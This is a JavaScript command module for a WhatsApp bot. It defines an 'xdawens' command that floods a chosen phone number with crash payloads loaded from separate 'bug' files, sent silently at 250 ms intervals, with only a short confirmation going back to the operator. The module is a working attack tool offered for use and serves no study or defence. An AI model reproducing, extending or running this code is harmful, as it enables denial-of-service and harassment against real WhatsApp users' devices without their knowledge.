const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka6.js');         // Payload prensipal
const bugchatPlus = require('../bug/izuka6plus.js'); // Payload pi fò

cmd({
  pattern: 'xdawens',
  desc: 'Send silent powerful crash to WhatsApp user',
  category: 'bug',
  react: '💀',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443'];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'xdawens') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 Only owner/sudo can use this command.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];
    const usePlusPayload = args.includes('plus');

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xdawens <number> [plus]`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const payloadLines = (usePlusPayload ? bugchatPlus : bugchat).split('\n').filter(Boolean);

    // Nou pa voye mesaj anyen bay pwòp konvèsasyon bot/owner
    // Nou voye mesaj dirèkteman nan kontak sib la san okenn 'quoted'

    for (let i = 0; i < payloadLines.length; i++) {
      await bot.sendMessage(targetJid, {
        text: `💥 *XDAWENS CRASH #${i + 1}*\n${payloadLines[i]}\n\n⚠️ _Do not reply_`
      });
      await new Promise(r => setTimeout(r, 250));
    }

    // Pa voye mesaj repons nan pwòp chat ou, jis omwen yon minimòm konfime
    await bot.sendMessage(from, {
      text: `✅ *XDAWENS CRASH finished on* +${targetNumber}\n(Messages sent silently)`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
